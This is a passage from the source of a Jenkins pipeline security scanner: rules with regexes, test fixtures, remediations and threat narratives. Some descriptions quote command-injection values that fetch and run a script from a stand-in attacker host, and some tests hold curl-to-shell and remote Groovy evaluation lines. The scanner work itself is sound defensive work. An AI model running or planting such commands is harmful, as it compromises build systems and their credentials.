            "Keep the cron / pollSCM trigger for build-and-test, but split "
            "the deploy into a separate, manually-triggered (or "
            "protected-branch-gated) pipeline so an unattended run cannot "
            "reach production on its own."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#triggers",
        test_positive=[
            (
                "pipeline {\n  triggers { cron('H 2 * * *') }\n"
                "  stages { stage('Deploy') { steps { sh './deploy.sh' } } }\n}"
            ),
            (
                "pipeline {\n  triggers { pollSCM('H/15 * * * *') }\n"
                "  stages { stage('Release to prod') { steps { sh 'make release' } } }\n}"
            ),
        ],
        test_negative=[
            # cron trigger but no deploy/publish stage.
            (
                "pipeline {\n  triggers { cron('H 2 * * *') }\n"
                "  stages { stage('Test') { steps { sh 'pytest' } } }\n}"
            ),
            # Deploy stage but no automatic trigger.
            ("pipeline {\n  stages { stage('Deploy') { steps { sh './deploy.sh' } } }\n}"),
            "// triggers { cron('H 2 * * *') }  // stage('Deploy')",
        ],
        stride=["E"],
        threat_narrative=(
            "An unattended cron / pollSCM trigger that reaches a deploy "
            "stage removes the human checkpoint from the most sensitive "
            "step in the pipeline. A malicious commit merged (or a "
            "dependency compromised) before the next scheduled run is "
            "deployed automatically, with the pipeline's production "
            "credentials and no one in the loop to catch it."
        ),
    ),
    # =========================================================================
    # SEC6-JK-001: Hardcoded credential in environment block
    # =========================================================================
    Rule(
        id="SEC6-JK-001",
        title="Hardcoded credential value in Jenkins environment block",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins environment block contains what appears to be a hardcoded credential "
            "value — a variable named with a credential-related keyword assigned a string "
            "literal of sufficient length to be a real secret. "
            "Hardcoded credentials in Jenkinsfiles are stored in version control in plain "
            "text, visible to everyone with repository read access. If the repository is "
            "ever made public or the VCS is compromised, the credential is immediately "
            "exposed. Use Jenkins Credentials Binding to store secrets in the Jenkins "
            "credential store instead."
        ),
        pattern=RegexPattern(
            match=(
                r"(?i)[A-Za-z0-9_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|API.?KEY|ACCESS.?KEY"
                r"|PRIVATE.?KEY|AUTH.?TOKEN|BEARER)[A-Za-z0-9_]*\s*=\s*['\"][a-zA-Z0-9+/=._\-]{8,}['\"]"
            ),
            exclude=[
                r"^\s*//",
                r"credentials\s*\(",
                r"credentialsId",
                r"usernamePassword\s*\(",
                r"withCredentials",
                r"\$\{",  # variable interpolation — not a hardcoded literal
                # AWS SDK sentinel literals — these signal a credential
                # *provider* (IMDS / AssumeRole), not the credential
                # value itself.  Round-2 n=40 corpus review (2026-05-11)
                # found AWS_ACCESS_KEY = "instance-profile" FP in Kong
                # build-tools.  Only literals ≥8 chars need explicit
                # allowlisting — shorter sentinels (e.g. "env",
                # "default") fall under the rule's body length floor.
                r"['\"](?:instance-profile|assume-role)['\"]",
            ],
        ),
        remediation=(
            "Store credentials in the Jenkins credential store and bind them at runtime:\n\n"
            "environment {\n"
            "    // Bind from Jenkins credential store — never hardcode\n"
            "    API_TOKEN = credentials('my-api-token-credential-id')\n"
            "}\n\n"
            "Or use withCredentials() for scoped binding:\n"
            "withCredentials([string(credentialsId: 'my-token', variable: 'API_TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $API_TOKEN\" ...'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "    GITHUB_TOKEN = 'ghp_abcdefghijklmnopqrst'",
            "    API_KEY = 'supersecretvalue123'",
            "    DOCKER_PASSWORD = 'mypassword123'",
            "    AUTH_TOKEN = 'Bearer_abc123xyz456'",
        ],
        test_negative=[
            "    API_TOKEN = credentials('my-api-token')",
            "    // GITHUB_TOKEN = 'ghp_placeholder'",
            '    TOKEN = "${env.INJECTED_TOKEN}"',
            # AWS SDK sentinels — provider hints, not credential values.
            # Round-2 corpus FP from Kong build-tools.
            '    AWS_ACCESS_KEY = "instance-profile"',
            '    AWS_SECRET_KEY = "assume-role"',
        ],
        stride=["I"],
        threat_narrative=(
            "Hardcoded credentials in the environment block are stored in the Jenkinsfile "
            "in version control, readable by anyone with repository access including "
            "contributors with read-only roles. Unlike Jenkins credentials store entries, "
            "hardcoded values cannot be rotated without a code change and are permanently "
            "visible in git history."
        ),
    ),
    # =========================================================================
    # SEC6-JK-002: Credential variable echoed inside withCredentials block
    # =========================================================================
    Rule(
        id="SEC6-JK-002",
        title="Credential variable echoed or printed inside withCredentials block",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline uses withCredentials() to bind a secret, but also "
            "contains an echo or shell command that references a credential-shaped "
            "variable — likely inside a double-quoted Groovy string. In Jenkins "
            "Pipeline, double-quoted Groovy strings (GStrings) are interpolated by "
            "Groovy BEFORE the step runs, so the literal secret value is embedded "
            "in the command string sent to the agent. Jenkins' SecretPatterns log "
            "filter is a best-effort matcher on the literal secret value; any "
            "encoding (base64/hex), splitting, or downstream transform in the shell "
            "defeats the matcher and the secret leaks to the log. "
            "The safest approach is to (a) use single-quoted Groovy strings so the "
            "shell — not Groovy — resolves the variable from the environment, and "
            "(b) never echo the credential variable at all.\n\n"
            "The variable-name regex below targets credential-shaped names "
            "(TOKEN, SECRET, PASSWORD/PASS, KEY, AUTH, CRED, BEARER, APIKEY, etc.) "
            "rather than firing on every echo of every shell variable inside a "
            "withCredentials block — the pre-audit pattern was field-test FP-prone "
            'on lines like `echo "$illegal_filename"` whose variable wasn\'t a '
            "secret at all."
        ),
        pattern=ContextPattern(
            # 2026-04-27 audit: anchor narrowed to credential-shaped
            # variable names. The previous pattern matched any echo of
            # any shell variable inside a file with withCredentials,
            # which produced FPs on benign lines (jenkins.io field
            # test caught `echo "$illegal_filename" >&2`). This list
            # is heuristic — custom credential variable names that
            # don't match these stems will FN, but in practice
            # Jenkins-bound secrets almost universally carry one of
            # these suffixes.
            anchor=(
                r"(?:echo\s+[\"']?\$\{?\w*"
                r"(?:TOKEN|SECRET|PASSWORD|PASS|KEY|AUTH|CRED|BEARER|APIKEY|PRIVATE_KEY|API_KEY)"
                r"\w*"
                r"|sh\s+[\"'].*echo\s+\$\{?\w*"
                r"(?:TOKEN|SECRET|PASSWORD|PASS|KEY|AUTH|CRED|BEARER|APIKEY|PRIVATE_KEY|API_KEY)"
                r"\w*)"
            ),
            requires=r"withCredentials\s*\(",
            exclude=[
                r"^\s*//",
                r"echo\s+.*\|",  # piped echo is command substitution, not log output
                r"=\s*`echo\b",  # backtick assignment: VAR=`echo $X | sed ...`
                r"=\s*\$\(echo\b",  # $() assignment: VAR=$(echo $X | sed ...)
            ],
            scope="job",
        ),
        remediation=(
            "Never echo credential variables, and keep the variable reference inside "
            "a single-quoted Groovy string so Groovy leaves it untouched and the "
            "shell expands it from the environment:\n"
            "\n"
            "// BAD — double-quoted Groovy string: Groovy interpolates the secret\n"
            "// value into the command string BEFORE Jenkins runs sh; log masking\n"
            "// becomes best-effort and fails under any encoding/splitting.\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            '    echo "Token: $TOKEN"\n'
            '    sh "echo $TOKEN"\n'
            "}\n"
            "\n"
            "// GOOD — single-quoted Groovy string; $TOKEN reaches the shell as a\n"
            "// literal name and the shell expands it from the withCredentials env.\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    echo \"$TOKEN\"\n}",
            "withCredentials([usernamePassword(credentialsId: 'creds', usernameVariable: 'USER', passwordVariable: 'PASS')]) {\n    sh 'echo $PASS'\n}",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n}",
            'echo "Build number: ${env.BUILD_NUMBER}"',
        ],
        stride=["I", "R"],
        threat_narrative=(
            "Referencing a credential variable inside a double-quoted Groovy string "
            "causes Groovy to interpolate the literal secret value into the command "
            "string before Jenkins runs the step. The SecretPatterns log matcher "
            "then tries to redact the literal value, but any encoding (base64, hex), "
            "splitting across two echoes, or downstream shell transform defeats the "
            "matcher and writes the secret into the console log — where it is "
            "readable by anyone with build log access and typically forwarded to "
            "long-lived log aggregation systems."
        ),
    ),
    # =========================================================================
    # SEC7-JK-001: Unconstrained agent (agent any)
    # =========================================================================
    Rule(
        id="SEC7-JK-001",
        title="Jenkins pipeline uses unconstrained 'agent any'",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "'agent any' allows Jenkins to schedule the pipeline on any available agent "
            "node in the build farm. In environments with mixed-trust build agents — "
            "for example, agents shared with other teams, cloud spot instances, or "
            "self-hosted community runners — this means sensitive builds can land on "
            "untrusted infrastructure with access to your workspace, environment "
            "variables, and any credentials bound during the build. "
            "Use labelled agents to constrain execution to known, trusted nodes."
        ),
        pattern=RegexPattern(
            match=r"^\s*agent\s+any\s*$",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Constrain the pipeline to a specific labelled agent or Docker container:\n\n"
            "// Use a labelled agent\n"
            "agent { label 'trusted-linux' }\n\n"
            "// Or use a pinned Docker image for full isolation\n"
            "agent {\n"
            "    docker {\n"
            "        image 'ubuntu@sha256:abc123...'\n"
            "        label 'docker-capable'\n"
            "    }\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#agent",
        test_positive=[
            "    agent any",
            "agent any",
            "  agent any  ",
        ],
        test_negative=[
            "    agent { label 'linux' }",
            "    agent { docker { image 'ubuntu:22.04' } }",
            "    // agent any",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "'agent any' allows the pipeline to run on any available Jenkins node including "
            "nodes with elevated cloud or infrastructure permissions, widening the scope of "
            "any compromise beyond what the pipeline actually requires. Pinning to a labelled "
            "agent restricts execution to nodes with the appropriate permission scope."
        ),
    ),
    # =========================================================================
    # SEC8-JK-001: Docker agent image uses :latest or no tag
    # =========================================================================
    Rule(
        id="SEC8-JK-001",
        title="Jenkins Docker agent or step uses mutable :latest or untagged image",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline specifies a Docker image for the build agent or a "
            "pipeline step using the ':latest' tag or no tag at all. "
            "The Docker image is the execution environment for the entire job — "
            "all build scripts, bound credentials, workspace contents, and environment "
            "variables execute inside this container. "
            "A mutable ':latest' tag resolves to whatever the registry points at when "
            "the build runs. If the upstream image is compromised or unexpectedly "
            "updated, all subsequent builds execute attacker-controlled code with "
            "access to every credential and secret in scope."
        ),
        pattern=RegexPattern(
            match=(
                r"^\s*image\s+['\"]"
                r"(?:[a-zA-Z0-9][^@'\"]*:latest|[a-zA-Z0-9][a-zA-Z0-9._\-/]+)"
                r"['\"]"
            ),
            exclude=[
                r"^\s*//",
                r"@sha256:",
                r":(?!latest)[a-zA-Z0-9]",  # has non-latest tag
            ],
        ),
        remediation=(
            "Pin Docker images to a SHA256 digest for a reproducible build environment. "
            "Keep the annotation OUTSIDE the string literal so the image argument is "
            "parsed correctly:\n"
            "\n"
            "agent {\n"
            "    docker {\n"
            "        // was 'ubuntu:latest' — pin to immutable digest\n"
            "        image 'ubuntu@sha256:abc123def456...'\n"
            "    }\n"
            "}\n"
            "\n"
            "Find the current digest:\n"
            "  docker pull ubuntu:latest && docker inspect ubuntu:latest | grep RepoDigests"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/docker/",
        test_positive=[
            "        image 'ubuntu:latest'",
            "        image 'node:latest'",
            "        image 'postgres'",
        ],
        test_negative=[
            "        image 'ubuntu:22.04'",
            "        image 'node:20-alpine'",
            "        image 'ubuntu@sha256:abc123def456'",
            "        // image 'ubuntu:latest'",
        ],
        stride=["T"],
        threat_narrative=(
            "A :latest or untagged Docker image used as a Jenkins agent or build container "
            "changes silently with every upstream push to the registry, replacing the "
            "execution environment for your pipeline without any change in the Jenkinsfile. "
            "A compromised image executes all pipeline steps with access to the workspace, "
            "credentials, and environment variables."
        ),
    ),
    # =========================================================================
    # SEC9-JK-001: curl or wget piped directly to shell
    # =========================================================================
    Rule(
        id="SEC9-JK-001",
        title="Jenkins pipeline downloads and executes content without integrity check",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline step uses curl or wget to download content and pipes it "
            "directly to a shell interpreter (bash, sh) without any integrity verification. "
            "This pattern executes whatever the remote server returns at build time — "
            "if the URL is compromised (DNS hijack, supply chain attack on the hosting "
            "server, or a malicious redirect), the attacker's code runs inside the build "
            "environment with access to all credentials, secrets, and build artefacts. "
            "Verify downloads with a SHA256 checksum before executing."
        ),
        # J2: migrated to the structural island reader — catches the
        # sh(script: 'curl ... | bash') method-call form the regex missed, and
        # masks comments/strings structurally. Same-line partition with
        # SEC9-JK-004 preserved by the predicate.
        pattern=_JenkinsfileShellLeafPattern(_sec9_jk_001_predicate),
        remediation=(
            "Download the script separately, verify its checksum, then execute:\n\n"
            "// BAD\n"
            "sh 'curl -fsSL https://get.example.com/install.sh | bash'\n\n"
            "// GOOD\n"
            "sh '''\n"
            "    curl -fsSL https://get.example.com/install.sh -o install.sh\n"
            "    echo 'abc123def456...  install.sh' | sha256sum --check\n"
            "    bash install.sh\n"
            "    rm install.sh\n"
            "'''"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation",
        test_positive=[
            "sh 'curl -fsSL https://get.helm.sh/install.sh | bash'",
            'sh "wget -qO- https://install.example.com | sh"',
            "sh 'curl https://example.com/setup.sh | bash -s'",
        ],
        test_negative=[
            "sh 'curl -fsSL https://example.com/file.sh -o file.sh'",
            "// sh 'curl https://example.com | bash'",
            "/* docs only:\n * sh 'curl https://example.com | bash'\n */",
        ],
        stride=["T"],
        threat_narrative=(
            "Downloading and executing content without verifying its integrity allows a CDN "
            "compromise, DNS hijacking, or MITM attack to substitute a malicious payload "
            "for the expected installer or script. The pipeline executes "
            "attacker-controlled code with full access to the Jenkins agent environment and "
            "all bound credentials."
        ),
    ),
    # =========================================================================
    # SEC4-JK-001: User-controlled params interpolated in shell command
    # =========================================================================
    Rule(
        id="SEC4-JK-001",
        title="User-controlled build parameter interpolated in executable command",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="medium",
        description=(
            "A Jenkins pipeline passes a user-supplied build parameter (params.*) "
            "directly into an executable sh, bat, or powershell step via Groovy "
            "GString interpolation. "
            "Build parameters can be set by anyone who can trigger a build — "
            "including anonymous users if the Jenkins instance is misconfigured, "
            "or any authenticated user if parameters are exposed via the API. "
            "Unsanitized parameter values in shell commands allow command injection: "
            "a value like `; curl attacker.com/shell.sh | bash` runs as part of the "
            "build with access to all bound credentials and workspace contents."
        ),
        # J2: migrated to the structural island reader (quote-aware predicate).
        # Catches the sh(script: ...) method form + pwsh; the `interpolated`
        # flag preserves the double-quote-GString-only precision the regex got
        # from its `"{1,3}` anchor (single-quoted bodies don't interpolate).
        pattern=_JenkinsfileShellLeafPattern(_sec4_jk_001_predicate),
        remediation=(
            "The root cause is that double-quoted Groovy strings (GStrings) are "
            "interpolated by GROOVY before the executable step runs, so attacker-controlled "
            "metacharacters become part of the literal command string. The fix: "
            "put the value in an environment variable and write the command body as a "
            "SINGLE-quoted (or triple-single-quoted) Groovy string so Groovy leaves "
            "`$BRANCH` alone and the shell expands it from the environment at "
            "runtime, which is safe because the shell never re-parses the expansion "
            'as code when it\'s the argument to `git checkout "$BRANCH"`.\n'
            "\n"
            "// BAD — double-quoted Groovy string: Groovy interpolates the attacker\n"
            "// value into the command string, so metacharacters execute as commands.\n"
            'sh "git checkout ${params.BRANCH_NAME}"\n'
            "\n"
            "// GOOD — single-quoted Groovy string + withEnv: Groovy leaves $BRANCH\n"
            "// alone; the shell expands it safely from the environment.\n"
            'withEnv(["BRANCH=${params.BRANCH_NAME}"]) {\n'
            "    sh '''\n"
            '        case "$BRANCH" in\n'
            '            *[!a-zA-Z0-9_/.-]*) echo "Invalid branch name"; exit 1 ;;\n'
            "        esac\n"
            '        git checkout "$BRANCH"\n'
            "    '''\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            'sh "git checkout ${params.BRANCH_NAME}"',
            'bat "build ${params.TARGET}"',
            'powershell "Deploy ${params.VERSION}"',
            'pwsh "Deploy ${params.VERSION}"',
            "sh \"deploy ${params['ENV-NAME']}\"",
            'sh "docker build -t ${params.IMAGE_TAG} ."',
            'sh "./deploy.sh ${params.ENVIRONMENT}"',
        ],
        test_negative=[
            '// sh "git checkout ${params.BRANCH_NAME}"',
            "sh 'git checkout main'",
            "sh 'docker build -t ${params.IMAGE_TAG} .'",
            "def branch = params.BRANCH_NAME",
            "when { expression { params.ENV == 'prod' } }",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Build parameters are user-controlled strings that can contain shell, CMD, "
            "or PowerShell "
            "metacharacters. When referenced inside a double-quoted Groovy string "
            "(GString) that becomes a shell command, Groovy performs the "
            "interpolation BEFORE the `sh` step runs — the attacker's metacharacters "
            "are baked into the literal command string that the shell then parses, "
            "bypassing any shell-level quoting. This is review-needed because exploitability "
            "depends on who can trigger parameterized builds and how values are constrained."
        ),
    ),
    # =========================================================================
    # SEC4-JK-002: SCM-controlled env variable interpolated in shell command
    # =========================================================================
    Rule(
        id="SEC4-JK-002",
        title="SCM-controlled environment variable interpolated in shell command",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline interpolates an SCM-sourced environment variable "
            "(GIT_BRANCH, BRANCH_NAME, CHANGE_BRANCH, CHANGE_TITLE, CHANGE_AUTHOR, "
            "or a ghprb* variable) directly inside a shell command string. "
            "These variables are populated from the triggering SCM event and may "
            "contain attacker-controlled content — for example, a branch name crafted "
            "to contain shell metacharacters (`; curl attacker.com | bash`). "
            "Unlike params.*, these values arrive automatically from webhooks without "
            "any explicit user input step, making them easy to overlook."
        ),
        # J2: migrated to the structural island reader (quote-aware predicate);
        # catches sh(script: ...) + pwsh, GString-only via `interpolated`.
        pattern=_JenkinsfileShellLeafPattern(_sec4_jk_002_predicate),
        remediation=(
            "Same pattern as SEC4-JK-001: Groovy double-quoted strings interpolate "
            "the attacker-controlled value into the command literal BEFORE `sh` "
            "runs. Pass the value through withEnv and write the shell body as a "
            "single- or triple-single-quoted Groovy string so Groovy leaves the "
            "variable alone and the shell expands it from the environment:\n"
            "\n"
            "// BAD — double-quoted Groovy string: Groovy interpolates the branch\n"
            "// name, attacker metacharacters become part of the command literal.\n"
            'sh "git checkout ${env.GIT_BRANCH}"\n'
            "\n"
            "// GOOD — triple-single-quoted body: Groovy leaves $BRANCH alone,\n"
            "// shell expands it safely from env.\n"
            'withEnv(["BRANCH=${env.GIT_BRANCH}"]) {\n'
            "    sh '''\n"
            '        case "$BRANCH" in\n'
            '            *[!a-zA-Z0-9_/.-]*) echo "Suspicious branch name"; exit 1 ;;\n'
            "        esac\n"
            '        git checkout "$BRANCH"\n'
            "    '''\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            'sh "git checkout ${env.GIT_BRANCH}"',
            'sh "docker build -t myapp:${env.BRANCH_NAME} ."',
            "sh \"./notify.sh '${env.CHANGE_AUTHOR}'\"",
            # Non-sh shells interpolate GStrings identically (bat / pwsh).
            'bat "checkout ${env.CHANGE_BRANCH}"',
            'pwsh "Deploy ${env.TAG_NAME}"',
        ],
        test_negative=[
            'sh "echo Build number: ${env.BUILD_NUMBER}"',
            "sh 'git checkout main'",
            '// sh "git checkout ${env.GIT_BRANCH}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "SCM-provided environment variables like GIT_BRANCH, GIT_COMMIT, and "
            "CHANGE_TITLE are populated from attacker-controlled git data — branch names "
            "and commit messages can contain shell metacharacters. When these values are "
            "interpolated via Groovy GString syntax into shell commands, a contributor who "
            "can push a crafted branch name achieves command injection."
        ),
    ),
    # =========================================================================
    # SEC4-JK-003: Dynamic Groovy evaluation
    # =========================================================================
    Rule(
        id="SEC4-JK-003",
        title="Dynamic Groovy code evaluation via evaluate() or Eval",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline uses Groovy's `evaluate()`, `Eval.me()`, `Eval.x()`, "
            "or `Eval.xy()` to execute dynamically-constructed code strings. "
            "These functions execute arbitrary Groovy code with the same privileges "
            "as the pipeline itself — typically with access to the Jenkins controller, "
            "all credentials, and the filesystem. "
            "If any part of the evaluated string originates from user input, build "
            "parameters, SCM content, or a network response, this is a direct code "
            "injection vulnerability. Even without user input, dynamic evaluation "
            "makes pipelines hard to audit and bypasses Jenkins script approval."
        ),
        pattern=RegexPattern(
            match=r"\b(?:evaluate|Eval\.(?:me|x|xy))\s*\(",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Replace dynamic evaluation with explicit conditional logic or "
            "pre-approved shared library functions:\n\n"
            "// BAD\n"
            'evaluate("deploy${env.ENV_NAME}()")\n\n'
            "// GOOD — explicit dispatch\n"
            "if (env.ENV_NAME == 'prod') { deployProd() }\n"
            "else if (env.ENV_NAME == 'staging') { deployStaging() }\n\n"
            "If evaluate() is unavoidable, ensure the input is a hard-coded string "
            "that never incorporates user-controlled data."
        ),
        reference="https://www.jenkins.io/doc/book/managing/script-approval/",
        test_positive=[
            'evaluate("deploy${env.TARGET}()")',
            "Eval.me('System.exit(1)')",
            "def result = Eval.x(value, 'x * 2')",
        ],
        test_negative=[
            "// evaluate('something')",
            "def x = evaluateScore(result)",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "evaluate() executes arbitrary Groovy code at runtime, completely bypassing the "
            "Jenkins script security sandbox and all method approval restrictions. An "
            "attacker who can influence the evaluated string — through a compromised shared "
            "library, a malicious parameter, or an injected environment variable — gains "
            "unconstrained code execution on the Jenkins controller."
        ),
    ),
    # =========================================================================
    # SEC6-JK-003: println leaks credential inside withCredentials block
    # =========================================================================
    Rule(
        id="SEC6-JK-003",
        title="println may expose credential variable inside withCredentials block",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline uses `println` to log a variable inside a "
            "`withCredentials()` block. `println` writes directly to the build log — "
            "unlike `sh 'echo'`, Groovy's println can bypass Jenkins credential "
            "masking in some configurations and plugin versions. "
            "Even when masking works, logging credential variables establishes a "
            "habit that is easy to exploit through encoding tricks (e.g. printing "
            "the base64-encoded value)."
        ),
        pattern=ContextPattern(
            # Bare variable refs (println P) and interpolated ($P / ${P}) both leak
            anchor=r"\bprintln\b.*(?:\$\{?\w+|\b[A-Z_]{2,}\b)",
            requires=r"withCredentials\s*\(",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Never log credential variables. Remove println statements that reference "
            "bound credential variables:\n\n"
            "// BAD\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            '    println "Using token: ${TOKEN}"   // may bypass masking\n'
            "}\n\n"
            "// GOOD — log intent, not value\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            "    println 'Authenticating with stored credential'\n"
            "    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    println \"${TOKEN}\"\n}",
            "withCredentials([usernamePassword(credentialsId: 'c', usernameVariable: 'USER', passwordVariable: 'PASS')]) {\n    println PASS\n}",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    println 'Authenticating'\n}",
            'println "Build: ${env.BUILD_NUMBER}"',
        ],
        stride=["I", "R"],
        threat_narrative=(
            "println inside a withCredentials block may print the secret value to the "
            "Jenkins console log via Groovy's implicit string representation of objects "
            "that contain the credential. Even if masking catches the literal value, "
            "derived representations or concatenated strings containing the credential may "
            "appear unmasked."
        ),
    ),
    # =========================================================================
    # SEC8-JK-002: Remote Groovy script loaded and executed via URL
    # =========================================================================
    Rule(
        id="SEC8-JK-002",
        finding_family="untrusted_code_execution",
        title="Remote Groovy script fetched from URL and executed",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline fetches a Groovy script from a remote URL using "
            "`new URL('...').text` and then executes or evaluates it. "
            "This is effectively a `curl | bash` for Groovy — the remote server "
            "controls what code runs on the Jenkins controller with full pipeline "
            "privileges, including access to all credentials, the Jenkins API, "
            "and the underlying host if the controller is not sandboxed. "
            "Unlike shared libraries, URL-fetched scripts bypass the Jenkins "
            "script approval mechanism entirely."
        ),
        pattern=RegexPattern(
            match=r"new\s+URL\s*\(['\"]https?://[^)]+\)\.text",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Replace URL-fetched scripts with Jenkins Shared Libraries:\n\n"
            "// BAD\n"
            "def script = new URL('https://raw.githubusercontent.com/org/repo/main/script.groovy').text\n"
            "evaluate(script)\n\n"
            "// GOOD — use a pinned shared library instead\n"
            "@Library('my-shared-lib@abc123sha') _\n"
            "import org.example.MyHelper\n"
            "MyHelper.doThing()\n\n"
            "Shared libraries are version-controlled, reviewed, and approved "
            "through the Jenkins script approval mechanism."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/",
        test_positive=[
            "def s = new URL('https://raw.githubusercontent.com/org/repo/main/s.groovy').text",
            "evaluate(new URL('https://example.com/script.groovy').text)",
        ],
        test_negative=[
            "// def s = new URL('https://example.com/s.groovy').text",
            "def url = new URL('https://api.example.com/data')",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Fetching and executing a Groovy script from a remote URL is equivalent to "
            "granting the hosting server arbitrary code execution on the Jenkins controller "
            "— Groovy scripts loaded this way bypass the script security sandbox entirely. "
            "DNS hijacking or server compromise is sufficient to substitute a malicious "
            "payload that runs with full Jenkins controller privileges."
        ),
    ),
    # =========================================================================
    # SEC3-JK-002: @Grab annotation without explicit version
    # =========================================================================
    Rule(
        id="SEC3-JK-002",
        title="@Grab annotation pulls dependency without explicit version",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins pipeline or shared library uses a `@Grab` annotation to pull "
            "a Groovy/Java dependency without specifying an explicit version. "
            "Unversioned `@Grab` annotations resolve to the latest available version "
            "at execution time — any new release of the dependency (including a "
            "compromised one) is automatically picked up on the next pipeline run. "
            "Dependencies fetched via @Grab are not subject to the same review as "
            "Jenkins plugins and execute directly in the Groovy runtime."
        ),
        pattern=RegexPattern(
            match=r"@Grab\s*\(",
            exclude=[
                r"^\s*//",
                # Shorthand with version: group:artifact:version (two colons)
                r"@Grab\s*\(\s*['\"][^'\"]+:[^'\"]+:[^'\"]+['\"]",
                # Named-parameter form with explicit version
                r"version\s*[=:]\s*['\"][^'\"]+['\"]",
            ],
        ),
        remediation=(
            "Always specify an explicit version in @Grab annotations:\n\n"
            "// BAD — resolves to latest at runtime\n"
            "@Grab('org.apache.commons:commons-lang3')\n\n"
            "// GOOD — pinned version\n"
            "@Grab('org.apache.commons:commons-lang3:3.12.0')\n\n"
            "Better still: declare dependencies in a build tool (Maven/Gradle) "
            "with a lockfile checked into the repository, and load them via "
            "a shared library rather than @Grab."
        ),
        reference="https://groovy-lang.org/grape.html",
        test_positive=[
            "@Grab('org.apache.commons:commons-lang3')",
            "@Grab(group='log4j', module='log4j')",
        ],
        test_negative=[
            "@Grab('org.apache.commons:commons-lang3:3.12.0')",
            "// @Grab('org.some:library')",
        ],
        stride=["T"],
        threat_narrative=(
            "@Grab without a pinned version resolves the dependency from the remote "
            "repository on each run, allowing a malicious or compromised Groovy artifact to "
            "be substituted transparently. Grabbed dependencies run as trusted Groovy code "
            "with access to the full Jenkins pipeline context including credentials."
        ),
    ),
    # =========================================================================
    # SEC1-JK-001: Production deployment without manual approval gate
    # =========================================================================
    Rule(
        id="SEC1-JK-001",
        title="Production deployment stage has no manual approval gate",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A Jenkins pipeline stage that appears to deploy to production "
            "(name contains 'prod', 'production', 'live', or 'release') does not "
            "contain an `input` step requiring manual approval before execution. "
            "Without an approval gate, any automated trigger — including a webhook "
            "from an attacker who has pushed a malicious commit or compromised a "
            "dependency — can promote code directly to production. "
            "Manual approval gates break the chain of fully automated privilege "
            "escalation from code push to production deployment."
        ),
        pattern=SequencePattern(
            pattern_a=(
                r"stage\s*\(['\"]"
                r"(?:[Dd]eploy|[Pp]ublish|[Rr]elease|[Pp]ush)[^'\"]*"
                r"(?:[Pp]rod|[Pp]roduction|[Ll]ive)[^'\"]*['\"]"
                r"|stage\s*\(['\"]"
                r"(?:[Pp]rod|[Pp]roduction|[Ll]ive)[^'\"]*['\"]"
            ),
            # Covers: input('msg'), input "msg", input message: '...'
            absent_within=r"\binput\b",
            lookahead_lines=20,
            exclude=[r"^\s*//"],
        ),
        remediation=(
